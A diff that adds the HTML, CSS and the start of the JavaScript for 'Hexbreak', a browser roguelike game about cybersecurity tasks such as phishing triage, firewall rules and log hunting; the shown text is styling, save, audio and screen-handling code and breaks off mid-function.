@@ -1,0 +1,1170 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="description" content="A cybersecurity roguelike: triage phishing, read firewall rules, peel encodings, hunt attacks in logs and contain malware before the breach meter hits 100%.">
+<meta name="theme-color" content="#0a0f1e">
+<meta property="og:title" content="Hexbreak">
+<meta property="og:description" content="A cybersecurity roguelike: triage phishing, read firewall rules, peel encodings, hunt attacks in logs and contain malware before the breach meter hits 100%.">
+<meta property="og:type" content="website">
+<link rel="icon" href="favicon.svg" type="image/svg+xml">
+<style>html,body{margin:0}</style>
+</head>
+<body>
+<title>Hexbreak</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;700&family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@400;600&display=swap">
+<style>
+/* Layout: one narrow console column. HUD strip on top, a single stage below that swaps screens. Single dark look by choice (a night-shift SOC console). */
+:root{
+  color-scheme:dark;
+  --ink:#0a0f1e; --panel:#111a31; --panel2:#18233f; --line:#2b3a66;
+  --text:#dde5ff; --dim:#8a97c0;
+  --amber:#ffb23e; --cyan:#56d6e8; --red:#ff5470; --green:#5fe0a0; --violet:#b39bff;
+  --display:'Chakra Petch','Trebuchet MS',sans-serif;
+  --mono:'IBM Plex Mono',ui-monospace,Menlo,Consolas,monospace;
+  --body:'IBM Plex Sans',system-ui,-apple-system,'Segoe UI',sans-serif;
+}
+html,body{height:100%}
+[hidden]{display:none!important}
+body{background:var(--ink);color:var(--text);font-family:var(--body);font-size:15px;line-height:1.5}
+*{box-sizing:border-box}
+#bgfx{position:fixed;inset:0;width:100%;height:100%;opacity:.16;pointer-events:none;z-index:0}
+.app{position:relative;z-index:1;max-width:820px;margin:0 auto;padding-block:16px 40px;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));display:flex;flex-direction:column;gap:16px}
+h1,h2,h3{font-family:var(--display);margin:0;text-wrap:balance;letter-spacing:.02em}
+h2{font-size:26px} h3{font-size:17px}
+p{margin:0}
+code,kbd,.mono{font-family:var(--mono)}
+kbd{font-size:11px;border:1px solid currentColor;border-radius:4px;padding:0 5px;opacity:.65;margin-left:6px}
+@media (hover:none){kbd{display:none}}
+label,.lab{font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim)}
+
+/* buttons */
+.btn{font-family:var(--display);font-weight:700;font-size:15px;letter-spacing:.04em;color:var(--text);background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:11px 18px;cursor:pointer;transition:transform .08s,background .15s,border-color .15s}
+@media(hover:hover){.btn:hover{border-color:var(--cyan)}} .btn:active{transform:translateY(1px) scale(.99)}
+.btn:focus-visible,.card:focus-visible,.bit:focus-visible,.logline:focus-visible{outline:2px solid var(--cyan);outline-offset:2px}
+.btn.primary{background:var(--amber);color:#1a1204;border-color:var(--amber)}@media(hover:hover){ .btn.primary:hover{background:#ffc566}}
+.btn.danger{border-color:var(--red);color:var(--red)}@media(hover:hover){ .btn.danger:hover{background:rgba(255,84,112,.12)}}
+.btn.ok{border-color:var(--green);color:var(--green)}@media(hover:hover){ .btn.ok:hover{background:rgba(95,224,160,.12)}}
+.btn.ghost{background:transparent} .btn.sm{padding:6px 12px;font-size:13px}
+.btn[disabled]{opacity:.4;cursor:not-allowed}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.stack{display:flex;flex-direction:column;gap:14px}
+
+/* HUD */
+.hud{display:grid;grid-template-columns:minmax(0,2fr) repeat(3,minmax(0,1fr)) auto;gap:14px;align-items:center;background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:10px 14px}
+.hud b{font-family:var(--mono);font-size:18px;font-variant-numeric:tabular-nums;display:block}
+.meter{height:8px;background:var(--ink);border-radius:4px;overflow:hidden;margin-top:6px}
+.meter i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--amber),var(--red));transition:width .5s}
+#hbv{display:inline;font-size:13px;color:var(--amber)}
+#hco.hot{color:var(--amber)}
+@media(max-width:560px){.hud{grid-template-columns:repeat(3,minmax(0,1fr)) auto;gap:8px 10px;padding:8px 12px}.hbreach{grid-column:1/-1}.hud b{font-size:15px}}
+
+/* home */
+.hero{padding:26px 0 6px}
+.hero h1{font-size:clamp(46px,13vw,92px);line-height:.9;letter-spacing:.01em}
+.hero h1 span{color:var(--amber)}
+.hero .tag{font-family:var(--mono);color:var(--cyan);margin-top:12px;font-size:14px}
+.hero .tag::after{content:'_';animation:blink 1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px}
+.rank{display:grid;grid-template-columns:1fr auto;gap:6px 16px;align-items:end}
+.rank .name{font-family:var(--display);font-size:22px;font-weight:700;color:var(--amber)}
+.xp{grid-column:1/-1;height:6px;background:var(--ink);border-radius:3px;overflow:hidden}
+.xp i{display:block;height:100%;background:var(--cyan)}
+.stats{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px}
+.stats div b{font-family:var(--mono);font-size:20px;display:block;font-variant-numeric:tabular-nums}
+@media(max-width:480px){.stats{grid-template-columns:repeat(2,minmax(0,1fr))}}
+.menu{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px}
+.menu .btn{text-align:left;padding:14px 16px}
+.menu .btn small{display:block;font-family:var(--body);font-weight:400;font-size:12.5px;letter-spacing:0;color:var(--dim);margin-top:2px}
+.menu .btn.primary small{color:#5a3d07}
+.menu .wide{grid-column:1/-1}
+@media(max-width:480px){.menu{grid-template-columns:1fr}}
+
+/* node cards */
+.cards{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px}
+@media(max-width:640px){.cards{grid-template-columns:1fr}}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px;text-align:left;color:var(--text);cursor:pointer;display:flex;flex-direction:column;gap:8px;font-family:var(--body);font-size:14px;transition:transform .12s,border-color .12s}
+@media(hover:hover){.card:hover{transform:translateY(-3px);border-color:var(--amber)}}
+.card .glyph{font-family:var(--mono);font-weight:600;font-size:26px;color:var(--cyan)}
+.card h3{font-size:19px}
+.card .meta{margin-top:auto;display:flex;justify-content:space-between;font-family:var(--mono);font-size:12px;color:var(--dim)}
+.card.hard{border-color:#6b3550} .card.hard .glyph{color:var(--red)}
+.card.special .glyph{color:var(--green)}
+.chip{display:inline-block;font-family:var(--mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;border:1px solid var(--line);border-radius:99px;padding:2px 9px;color:var(--dim)}
+.chip.red{color:var(--red);border-color:var(--red)} .chip.amber{color:var(--amber);border-color:var(--amber)} .chip.green{color:var(--green);border-color:var(--green)}
+.path{display:flex;gap:6px;align-items:center}
+.path i{width:26px;height:6px;border-radius:3px;background:var(--line)} .path i.done{background:var(--green)} .path i.cur{background:var(--amber)} .path i.boss{width:38px}
+.pips{font-family:var(--mono);color:var(--amber);letter-spacing:.2em}
+.pips s{color:var(--line);text-decoration:none}
+
+/* game frame */
+.game,.brief,.result{display:flex;flex-direction:column;gap:14px}
+.ghead{display:flex;justify-content:space-between;align-items:end;gap:12px;flex-wrap:wrap}
+.gtag{font-family:var(--mono);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--cyan)}
+.gprog{font-family:var(--mono);color:var(--dim);font-size:13px}
+.timer{position:relative;height:22px;background:var(--panel);border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.tfill{position:absolute;inset:0;background:var(--cyan);transform-origin:left;opacity:.85}
+.tfill.low{background:var(--red)}
+.timer span{position:absolute;right:8px;top:0;line-height:20px;font-family:var(--mono);font-size:12px;color:var(--text);mix-blend-mode:difference}
+.timer.hit{animation:shake .3s}
+@keyframes shake{25%{transform:translateX(-6px)}50%{transform:translateX(5px)}75%{transform:translateX(-3px)}}
+.brief{padding:20px 0}.brief h2{font-size:34px}.brief .glyph{color:var(--cyan);font-family:var(--mono);margin-right:12px}
+.brief p{max-width:60ch}.keys{font-family:var(--mono);font-size:13px;color:var(--dim)}
+.actions{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.actions .btn{padding:16px}
+.verdict{display:flex;gap:12px;justify-content:space-between;align-items:center;border-radius:8px;padding:12px 14px;border:1px solid;animation:pop .18s}
+.verdict.ok{border-color:var(--green);background:rgba(95,224,160,.08)} .verdict.bad{border-color:var(--red);background:rgba(255,84,112,.08)}
+.verdict b{font-family:var(--display);margin-right:6px} .verdict.ok b{color:var(--green)} .verdict.bad b{color:var(--red)}
+.verdict>div{min-width:0}
+@keyframes pop{from{transform:scale(.97);opacity:0}}
+.hint{font-size:13px;color:var(--dim);border-left:2px solid var(--line);padding-left:10px}
+
+/* phish */
+.mail{background:var(--panel);border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.mrow{display:flex;gap:10px;padding:8px 14px;border-bottom:1px solid var(--line);flex-wrap:wrap;align-items:baseline}
+.mrow .lab{width:62px;flex:none} .mrow code{color:var(--cyan);word-break:break-all}
+.mbody{padding:16px 14px;display:flex;flex-direction:column;gap:12px}
+.fakelink{align-self:flex-start;background:var(--panel2);border:1px solid var(--line);border-radius:6px;padding:8px 14px;color:var(--cyan);text-decoration:underline;word-break:break-all}
+.href{font-family:var(--mono);font-size:12.5px;color:var(--dim);word-break:break-all} .href code{color:var(--amber)}
+.attach{align-self:flex-start;font-family:var(--mono);font-size:13px;border:1px dashed var(--line);border-radius:6px;padding:6px 10px}
+
+/* firewall */
+.rules{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:4px;font-family:var(--mono);font-size:13.5px}
+.rules li{display:grid;grid-template-columns:28px 64px minmax(0,1fr) minmax(0,1.3fr);gap:8px;padding:7px 10px;background:var(--panel);border:1px solid var(--line);border-radius:6px}
+.rules li.hitok{border-color:var(--green);background:rgba(95,224,160,.12)} .rules li.hitbad{border-color:var(--red);background:rgba(255,84,112,.14)}
+.rules .ALLOW{color:var(--green)} .rules .DENY{color:var(--red)} .rules .n{color:var(--dim)}
+.pkt{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;background:var(--panel2);border:1px solid var(--amber);border-radius:10px;padding:16px;animation:slide .18s}
+.pkt b{display:block;font-family:var(--mono);font-size:clamp(15px,4.2vw,22px);word-break:break-all} .pkt small{color:var(--dim);font-size:12px}
+@keyframes slide{from{transform:translateX(24px);opacity:0}}
+
+/* decoder */
+.cipher{font-family:var(--mono);font-size:clamp(14px,3.6vw,19px);background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:18px;word-break:break-all;min-height:96px;color:var(--amber)}
+.cipher.err{animation:shake .3s;border-color:var(--red)} .cipher.done{color:var(--green);border-color:var(--green)}
+.tools{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:8px}
+.tools .btn[data-k=undo]{grid-column:span 2}
+@media(max-width:480px){.tools{gap:6px}.tools .btn{padding:10px 2px;font-size:13px;letter-spacing:0}}
+.fl{cursor:pointer}.mbody .fl{border-radius:6px}.mbody p.fl,.lk{padding:4px 6px;margin:-4px -6px}
+.lk{display:flex;flex-direction:column;gap:8px;align-items:flex-start}
+@media(hover:hover){.fl:hover{background:rgba(86,214,232,.08)}.rules.pick li:hover{border-color:var(--cyan)}}
+.fl.hit{outline:2px solid var(--red);outline-offset:-2px;background:rgba(255,84,112,.1)}
+.fl.miss{outline:2px dashed var(--dim);outline-offset:-2px}
+.rules.pick li{cursor:pointer}
+.nd.opt circle:not(.hitc){stroke:var(--violet)!important;stroke-width:6;stroke-dasharray:none!important}
+@media(pointer:coarse){.rules.pick li{padding-block:9px}}
+.trail{font-family:var(--mono);font-size:12px;color:var(--dim);min-height:18px}
+
+/* logs */
+.logs{display:flex;flex-direction:column;gap:2px;font-family:var(--mono);font-size:12.5px}
+.logline{display:grid;grid-template-columns:64px 118px 40px minmax(0,1fr) 34px;gap:8px;text-align:left;background:var(--panel);border:1px solid transparent;border-radius:4px;color:var(--text);padding:6px 8px;cursor:pointer;font:inherit}
+@media(hover:hover){.logline:hover{border-color:var(--line);background:var(--panel2)}}
+.logline .p{word-break:break-all} .logline .t,.logline .ip{color:var(--dim)}
+.logline.found{border-color:var(--green);background:rgba(95,224,160,.12)} .logline.wrong{border-color:var(--red);opacity:.5;pointer-events:none}
+@media(max-width:560px){.logline{grid-template-columns:40px minmax(0,1fr) 34px}.logline .t,.logline .ip{display:none}}
+
+/* bits */
+.target{font-family:var(--mono);text-align:center;background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:18px}
+.target .big{font-size:clamp(28px,8vw,44px);font-weight:600;color:var(--amber);line-height:1.2;word-break:break-all}
+.bits{display:grid;grid-template-columns:repeat(8,minmax(0,1fr));gap:6px}
+.bit{font-family:var(--mono);background:var(--panel);border:1px solid var(--line);border-radius:8px;color:var(--dim);padding:10px 0;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:2px}
+.bit b{font-size:clamp(20px,6vw,30px);color:var(--text)} .bit small{font-size:10px}
+.bit.on{background:var(--cyan);border-color:var(--cyan);color:#06262c} .bit.on b{color:#06262c}
+.bits.solved .bit.on{background:var(--green);border-color:var(--green)}
+.cur{font-family:var(--mono);text-align:center;color:var(--dim)}
+
+/* lock */
+.grid{display:flex;flex-direction:column;gap:6px;align-items:center}
+.grow{display:flex;gap:6px}
+.cell{width:46px;height:50px;border:1px solid var(--line);border-radius:8px;background:var(--panel);display:grid;place-items:center;font-family:var(--mono);font-size:22px;font-weight:600}
+.cell.g{background:var(--green);color:#06301d;border-color:var(--green)} .cell.y{background:var(--amber);color:#3a2503;border-color:var(--amber)} .cell.n{background:var(--panel2);color:var(--dim)}
+.cell.cur{border-color:var(--cyan)}
+.pad{display:grid;grid-template-columns:repeat(6,minmax(0,1fr));gap:6px;max-width:420px;margin:0 auto;width:100%}
+.pad .btn{padding:10px 0;font-family:var(--mono)} .pad .g{border-color:var(--green);color:var(--green)} .pad .y{border-color:var(--amber);color:var(--amber)} .pad .n{opacity:.3}
+.pad .wide2{grid-column:span 3}
+
+/* quiz */
+.q{font-family:var(--display);font-size:clamp(19px,4.6vw,24px);font-weight:500}
+.opts{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:560px){.opts{grid-template-columns:1fr}}
+.opts .btn{text-align:left;font-family:var(--body);font-weight:600;letter-spacing:0}
+.opts .btn.right{border-color:var(--green);background:rgba(95,224,160,.15)} .opts .btn.wrongp{border-color:var(--red);background:rgba(255,84,112,.15)}
+
+/* result */
+.result h2{font-size:38px} .result.win h2{color:var(--green)} .result.lose h2{color:var(--red)}
+.tally{font-family:var(--mono);display:grid;grid-template-columns:1fr auto;gap:4px 20px;max-width:380px;font-variant-numeric:tabular-nums}
+.tally .tot{border-top:1px solid var(--line);padding-top:6px;font-size:20px;color:var(--amber);font-weight:600}
+.learn{display:flex;flex-direction:column;gap:8px}
+.entry{border-left:3px solid var(--violet);padding:4px 0 4px 12px} .entry h3{color:var(--violet);font-size:15px} .entry p{font-size:14px;color:var(--text)}
+.entry.new h3::after{content:'NEW';font-family:var(--mono);font-size:10px;margin-left:8px;color:var(--amber);letter-spacing:.1em}
+.entry.locked{border-color:var(--line)} .entry.locked h3,.entry.locked p{color:var(--dim)}
+.codex{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:14px}
+@media(max-width:600px){.codex{grid-template-columns:1fr}}
+.shop{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px}
+@media(max-width:640px){.shop{grid-template-columns:1fr}}
+.perk{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px;display:flex;flex-direction:column;gap:8px}
+.perk p{font-size:13.5px;color:var(--dim);flex:1}
+.bossname{font-family:var(--display);font-size:clamp(44px,12vw,80px);font-weight:700;color:var(--red);line-height:1}
+.achs{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px}
+@media(max-width:560px){.achs{grid-template-columns:1fr}}
+.ach{border:1px solid var(--line);border-radius:8px;padding:10px 12px;opacity:.45} .ach.got{opacity:1;border-color:var(--amber)} .ach b{font-family:var(--display)} .ach p{font-size:13px;color:var(--dim)}
+.game{position:relative}
+#stage.paused #gbody{visibility:hidden}
+#stage.paused .game::after{content:'Paused. Press Esc or the II button to resume.';position:absolute;top:150px;left:0;right:0;text-align:center;font-family:var(--mono);color:var(--amber)}
+.hud.crit .meter{animation:pulse 1s infinite}
+@keyframes pulse{50%{box-shadow:0 0 0 4px rgba(255,84,112,.4)}}
+.pt{position:fixed;left:50%;top:40%;width:9px;height:9px;border-radius:2px;pointer-events:none;z-index:14;animation:pt .85s ease-out forwards}
+@keyframes pt{to{transform:translate(var(--dx),var(--dy)) rotate(280deg);opacity:0}}
+body.hurt::after{content:'';position:fixed;inset:0;box-shadow:inset 0 0 140px var(--red);pointer-events:none;z-index:13;animation:fade .5s forwards}
+@keyframes fade{to{opacity:0}}
+.card[disabled]{opacity:.45;cursor:not-allowed;transform:none;border-color:var(--line)}
+.stars{font-family:var(--mono);color:var(--amber);letter-spacing:.15em}.stars s{color:var(--line);text-decoration:none}
+.net{width:100%;height:auto;max-height:56vh;background:var(--panel);border:1px solid var(--line);border-radius:10px;display:block}
+.net line{stroke:var(--line);stroke-width:4;stroke-linecap:round}
+.net line.hot{stroke:var(--red);stroke-dasharray:6 8;animation:dash .6s linear infinite}
+.net line.dead{stroke:var(--red);opacity:.45}.net line.cut{opacity:.25;stroke-dasharray:3 9}
+@keyframes dash{to{stroke-dashoffset:-14}}
+.nd{cursor:pointer}.nd circle{fill:var(--panel2);stroke:var(--cyan);stroke-width:3;transition:fill .2s}
+@media(hover:hover){.nd:hover circle{fill:var(--line)}}
+.nd text{fill:var(--text);font-family:var(--mono);font-size:14px;font-weight:600;text-anchor:middle;pointer-events:none}
+.nd.inf{cursor:default}.nd.inf circle{fill:var(--red);stroke:var(--red)}.nd.inf text{fill:#2a0610}
+.nd.blk{cursor:default}.nd.blk circle{fill:var(--ink);stroke:var(--dim);stroke-dasharray:5 5}.nd.blk text{fill:var(--dim)}
+.nd.tgt{cursor:default}.nd.tgt circle{stroke:var(--amber);fill:var(--panel2)}.nd.tgt text{fill:var(--amber)}
+.spread{height:6px;background:var(--panel);border-radius:3px;overflow:hidden}.spread i{display:block;height:100%;background:var(--red);transform-origin:left}
+.pwlist{display:flex;flex-direction:column;gap:8px}
+.pwlist .btn{display:flex;gap:14px;align-items:center;text-align:left;font-family:var(--mono);font-weight:400;letter-spacing:0;word-break:break-all}
+.pwlist .rk{width:20px;flex:none;color:var(--green);font-weight:600}
+.pwlist .btn.lockd{border-color:var(--green);background:rgba(95,224,160,.08)}
+.pwlist .btn.nope{animation:shake .3s;border-color:var(--red)}
+.commits{display:grid;gap:3px}
+.commits button{height:28px;border-radius:4px;border:1px solid var(--cyan);background:var(--panel2);cursor:pointer;padding:0;font-family:var(--mono);font-size:10px;color:var(--dim)}
+@media(hover:hover){.commits button:hover{background:var(--cyan)}}
+.commits button.ok{background:rgba(95,224,160,.25);border-color:transparent;cursor:default}
+.commits button.bad{background:rgba(255,84,112,.3);border-color:transparent;cursor:default}
+.commits button.hit{background:var(--red);border-color:var(--red)}
+.axis{display:flex;justify-content:space-between;font-family:var(--mono);font-size:11px;color:var(--dim)}
+.kpads{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:8px}
+.kpads .btn{padding:14px 0;display:flex;flex-direction:column;align-items:center;font-family:var(--mono)}
+.kpads b{font-size:22px}.kpads small{color:var(--dim);font-weight:400}
+.kpads .btn.lit{background:var(--cyan);border-color:var(--cyan);color:#06262c}
+.kpads .btn.err{background:var(--red);border-color:var(--red);color:#2a0610}
+#kd.popk{animation:pop .18s}
+.lb{width:100%;border-collapse:collapse;font-variant-numeric:tabular-nums}
+.lb td,.lb th{padding:8px 10px;border-bottom:1px solid var(--line);text-align:left}
+.lb th{font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim);font-weight:400}
+.lb td.num,.lb th.num{text-align:right;font-family:var(--mono)}
+.lb tr.me td{color:var(--amber)}
+.tablewrap{overflow-x:auto}
+#toasts{position:fixed;left:0;right:0;bottom:calc(16px + env(safe-area-inset-bottom,0px));display:flex;flex-direction:column;align-items:center;gap:8px;pointer-events:none;z-index:20;padding:0 16px}
+.toast{background:var(--panel2);border:1px solid var(--amber);border-radius:8px;padding:10px 16px;font-family:var(--mono);font-size:13px;animation:pop .2s}
+.toast b{color:var(--amber)}
+.float{position:fixed;left:50%;top:38%;transform:translateX(-50%);font-family:var(--display);font-weight:700;font-size:40px;color:var(--amber);pointer-events:none;z-index:15;animation:rise .9s forwards}
+@keyframes rise{to{transform:translate(-50%,-70px);opacity:0}}
+/* touch and small screens */
+html{-webkit-text-size-adjust:100%;text-size-adjust:100%}
+body{overscroll-behavior-y:none;-webkit-tap-highlight-color:transparent}
+button,.nd{touch-action:manipulation;-webkit-tap-highlight-color:transparent}
+.game button,.game .nd,.hud,.cards,.menu,.shop .btn{-webkit-user-select:none;user-select:none;-webkit-touch-callout:none}
+.app{padding-top:max(16px,env(safe-area-inset-top,0px));padding-bottom:calc(40px + env(safe-area-inset-bottom,0px))}
+#stage{overflow-x:clip}
+.timer{position:sticky;top:max(6px,env(safe-area-inset-top,0px));z-index:6}
+.nd circle.hitc{fill:transparent!important;stroke:none!important}
+.btn:active,.card:active,.bit:active,.logline:active{filter:brightness(1.25)}
+@media(pointer:coarse){
+  .btn{min-height:44px}
+  .btn.sm{min-height:40px;min-width:44px;padding:8px 14px}
+  .logline{padding:10px 8px}
+  .commits{gap:4px}.commits button{height:38px}
+  .pad .btn{padding:12px 0}
+  #stage.paused .game::after{content:'Paused. Tap the II button to resume.'}
+}
+@media(max-width:560px){
+  .app{gap:12px;padding-top:max(10px,env(safe-area-inset-top,0px))}
+  .game,.brief,.result{gap:12px}
+  h2{font-size:22px}.brief h2{font-size:28px}.result h2{font-size:32px}
+  .actions{position:sticky;bottom:calc(8px + env(safe-area-inset-bottom,0px));z-index:5}
+  .actions .btn{box-shadow:0 0 0 6px var(--ink)}
+  .rules{font-size:12.5px;gap:3px}.rules li{grid-template-columns:22px 50px minmax(0,1fr) minmax(0,1.2fr);gap:6px;padding:5px 8px}
+  .pkt{padding:12px;gap:8px}
+  .mbody{padding:12px;gap:10px}.mrow{padding:6px 12px}
+  .cipher{padding:14px;min-height:80px}
+  .target{padding:14px}
+  .grow.fut{display:none}
+  .grid{max-height:max(150px,calc(100dvh - 395px));overflow-y:auto;align-items:stretch;overscroll-behavior:contain}.grow{justify-content:center;flex:none}
+  .cell{width:44px;height:44px;font-size:20px}
+  .verdict{padding:10px 12px}
+  .lb td,.lb th{padding:8px 6px}
+  .float{font-size:32px}
+}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}#bgfx{display:none}}
+</style>
+
+<canvas id="bgfx" aria-hidden="true"></canvas>
+<div class="app">
+  <header class="hud" id="hud" hidden>
+    <div class="hbreach"><label>Breach <b id="hbv">0%</b></label><div class="meter"><i id="hbf"></i></div></div>
+    <div><label>Score</label><b id="hsc">0</b></div>
+    <div><label>Combo</label><b id="hco">×1.00</b></div>
+    <div><label>Credits</label><b id="hcr">0</b></div>
+    <button class="btn ghost sm" id="hquit">Quit</button>
+  </header>
+  <main id="stage"></main>
+</div>
+<div id="toasts" aria-live="polite"></div>
+
+<script>
+(()=>{'use strict';
+const $=(s,e=document)=>e.querySelector(s),$$=(s,e=document)=>[...e.querySelectorAll(s)];
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const stage=$('#stage');
+const dbg=o=>{if(window.__hx)window.__hx.cur=o};
+const once=fn=>{let d=false;return(...a)=>{if(d)return;d=true;return fn(...a)}};
+
+/* ---------- rng ---------- */
+let _r=Math.random;
+let RS=0;const seeded=()=>{RS|=0;RS=RS+0x6D2B79F5|0;let t=Math.imul(RS^RS>>>15,1|RS);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296};
+function mulberry(a){RS=a;return seeded}
+function hashStr(s){let h=2166136261;for(const c of s){h^=c.charCodeAt(0);h=Math.imul(h,16777619)}return h>>>0}
+const rnd=()=>_r(),ri=(a,b)=>a+Math.floor(rnd()*(b-a+1)),pick=a=>a[Math.floor(rnd()*a.length)];
+const shuffle=a=>{a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(rnd()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a};
+
+/* ---------- save ---------- */
+const KEY='hexbreak.v1';
+const S={xp:0,best:0,runs:0,wins:0,daily:{},streak:0,lastDaily:'',codex:{},ach:{},g:{},cls:'ana',mute:false,music:true,blitz:0};
+try{Object.assign(S,JSON.parse(localStorage.getItem(KEY)||'{}'))}catch(e){}
+const persist=()=>{try{localStorage.setItem(KEY,JSON.stringify(S))}catch(e){}};
+const dstr=d=>`${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}`;
+const today=()=>dstr(new Date());
+
+/* ---------- audio ---------- */
+let AC=null;
+function tone(f,d=.08,type='square',v=.04,when=0){if(S.mute)return;try{AC=AC||new(window.AudioContext||window.webkitAudioContext)();const o=AC.createOscillator(),g=AC.createGain(),t=AC.currentTime+when;o.type=type;o.frequency.value=f;g.gain.setValueAtTime(v,t);g.gain.exponentialRampToValueAtTime(.0001,t+d);o.connect(g).connect(AC.destination);o.start(t);o.stop(t+d+.02)}catch(e){}}
+const sfx={ok(){tone(660,.07);tone(990,.09,'square',.04,.06)},bad(){tone(150,.22,'sawtooth',.05)},click(){tone(420,.03,'triangle',.04)},
+  win(){[523,659,784,1047].forEach((f,i)=>tone(f,.12,'square',.04,i*.09))},lose(){[330,247,196,131].forEach((f,i)=>tone(f,.2,'sawtooth',.05,i*.13))}};
+/* quiet generative backing track: a slow minor bass line that tightens when the breach is critical */
+let mTick=0,mStep=0;const MB=[110,110,130.81,98,110,146.83,130.81,82.41],MH=[440,523.25,659.25,587.33,523.25,392,440,329.63];
+function mnote(f,d,type,v){if(!AC)return;try{const o=AC.createOscillator(),g=AC.createGain(),t=AC.currentTime;o.type=type;o.frequency.value=f;g.gain.setValueAtTime(.0001,t);g.gain.linearRampToValueAtTime(v,t+.03);g.gain.exponentialRampToValueAtTime(.0001,t+d);o.connect(g).connect(AC.destination);o.start(t);o.stop(t+d+.05)}catch(e){}}
+addEventListener('pointerdown',()=>{try{AC=AC||new(window.AudioContext||window.webkitAudioContext)();if(AC.state==='suspended')AC.resume()}catch(e){}});
+setInterval(()=>{if(!S.music||document.hidden||!AC)return;const hot=run&&run.breach>=70,every=hot?2:3;mTick++;if(mTick%every)return;const i=mStep++%16;
+  if(i%2===0)mnote(MB[(i/2)%8]*(hot?1.06:1),.5,'sine',.045);if(i%4===2||(hot&&i%2===1))mnote(MH[(mStep*3)%8],.22,'triangle',.012)},150);
+
+/* ---------- screen plumbing ---------- */
+let keyFn=null,curTimer=null,pending=[],tickers=[],run=null;
+const reduced=matchMedia('(prefers-reduced-motion:reduce)').matches;
+function togglePause(){const t=curTimer;if(!t||t.done)return;t.hold=!t.hold;stage.classList.toggle('paused',!!t.hold)}
+addEventListener('keydown',e=>{if(e.metaKey||e.ctrlKey||e.altKey||e.repeat)return;if(e.key==='Escape'){togglePause();return}if(curTimer&&curTimer.hold)return;if(keyFn&&keyFn(e)===true)e.preventDefault()});
+document.addEventListener('visibilitychange',()=>{if(document.hidden&&curTimer&&!curTimer.done&&!curTimer.hold)togglePause()});
+function every(fn,ms){const id=setInterval(fn,ms);tickers.push(id);return id}
+function burst(){if(reduced)return;const cs=['#ffb23e','#56d6e8','#5fe0a0','#b39bff'];for(let i=0;i<22;i++){const q=document.createElement('i');q.className='pt';q.style.setProperty('--dx',(Math.random()*2-1)*220+'px');q.style.setProperty('--dy',(-Math.random()*190-30)+'px');q.style.background=cs[i%4];document.body.appendChild(q);setTimeout(()=>q.remove(),850)}}
+function buzz(p){try{if(!S.mute&&navigator.vibrate)navigator.vibrate(p)}catch(e){}}
+function hurt(){buzz(45);if(reduced)return;document.body.classList.add('hurt');setTimeout(()=>document.body.classList.remove('hurt'),500)}
+function later(fn,ms){const id=setTimeout(fn,ms);pending.push(id);return id}
+function clearScreen(){if(curTimer){curTimer.stop();curTimer=null}pending.forEach(clearTimeout);pending=[];tickers.forEach(clearInterval);tickers=[];keyFn=null;stage.classList.remove('paused')}
+function show(html){clearScreen();stage.innerHTML=html;window.scrollTo(0,0)}
+function toast(html){const t=document.createElement('div');t.className='toast';t.innerHTML=html;$('#toasts').appendChild(t);setTimeout(()=>t.remove(),3200)}
+function floatText(txt){const f=document.createElement('div');f.className='float';f.textContent=txt;document.body.appendChild(f);setTimeout(()=>f.remove(),900)}
+function frame(g,prog){clearScreen();stage.innerHTML=`<section class="game"><div class="ghead"><div><span class="gtag">${g.tag}</span><h2>${g.name}</h2></div><div class="row"><div class="gprog" id="gprog">${prog||''}</div><button class="btn ghost sm" id="pz" title="Pause (Esc)">II</button></div></div><div class="timer"><div class="tfill" id="tfill"></div><span id="tnum"></span></div><div id="gbody" class="stack"></div></section>`;window.scrollTo(0,0);$('#pz').onclick=togglePause;return $('#gbody')}
+function startTimer(sec,onEnd){const m=run?run.mods.time*(run.boss&&run.boss.time||1):1;const t={tot:sec*m,left:sec*m,paused:false,done:false};let last=performance.now();
